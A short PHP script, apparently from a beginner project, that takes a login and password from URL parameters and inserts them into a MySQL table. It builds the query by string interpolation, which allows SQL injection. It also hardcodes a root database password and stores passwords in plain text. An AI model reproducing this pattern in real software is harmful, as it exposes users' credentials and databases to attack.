<?php include("cabecalho.php") ?>
<?php
$login = $_GET["login"];
$senha = $_GET["senha"];
$conexao = mysqli_connect('localhost', 'root', 'b@nco@@p', 'cr_em');
$query = "INSERT INTO info_dados (login, senha)
VALUES ('{$login}', '{$senha}')";
mysqli_query($conexao, $query);
mysqli_close($conexao);?>
<?php include("rodape.php") ?>
